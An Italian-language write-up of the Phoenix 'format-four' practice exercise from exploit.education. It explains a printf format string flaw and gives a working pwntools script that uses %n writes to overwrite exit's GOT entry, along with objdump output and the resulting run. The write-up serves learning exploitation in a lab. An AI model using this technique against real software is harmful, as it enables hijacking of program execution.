### Descrizione del Codice

Il programma `format_four.c` introduce la scrittura in memoria in modo tale da poter controllare l'esecuzione del codice.

### Funzionamento del Programma

1. Il programma legge un input dall'utente e lo memorizza in `buf`.
2. Chiama la funzione `bounce` che stampa il contenuto di `buf` usando `printf`.
3. La funzione `bounce` termina il programma chiamando `exit`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `printf` con un input controllato dall'utente senza specificare un formato, il che può causare una vulnerabilità di formato. Questo può essere sfruttato per sovrascrivere l'indirizzo della funzione `exit` nella Global Offset Table (GOT) con l'indirizzo della funzione `congratulations`.

### Exploit

L'exploit sfrutta la vulnerabilità di formato per sovrascrivere l'indirizzo della funzione `exit` nella GOT con l'indirizzo della funzione `congratulations`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ objdump -R /opt/phoenix/i486/format-four

/opt/phoenix/i486/format-four:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497d8 R_386_JUMP_SLOT   printf
080497dc R_386_JUMP_SLOT   puts
080497e0 R_386_JUMP_SLOT   read
080497e4 R_386_JUMP_SLOT   exit
080497e8 R_386_JUMP_SLOT   __libc_start_main

L'indirizzo di exit è 0x080497e4.

Otteniamo l'indirizzo della funzione congratulations:
$ objdump -t /opt/phoenix/i486/format-four | grep congratulations
08048503 g     F .text	00000019 congratulations

La funzione congratulations è a 0x08048503.

Soluzione:
# solve.py

from pwn import *

exit = 0x080497e4
congratulations = 0x08048503

buff = ""
buff += p32(exit+0)
buff += p32(exit+1)
buff += p32(exit+2)
buff += p32(exit+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 178       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 130       # JUNK
buff += "%n"            # write to second byte

buff += 'A' * 127       # JUNK
buff += "%n"            # write to third byte

buff += 'A' * 4         # JUNK
buff += "%n"            # write to forth byte

print(buff)

Eseguiamo lo script:
$ python solve.py | /opt/phoenix/i486/format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
0 0 0 f7f81cf7 f7ffb000 ffffd708 804857d ffffc700 ffffc700 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!

Il programma entra in un ciclo infinito perché abbiamo sovrascritto l'indirizzo di exit, ma l'importante è che siamo riusciti a reindirizzare l'esecuzione del codice.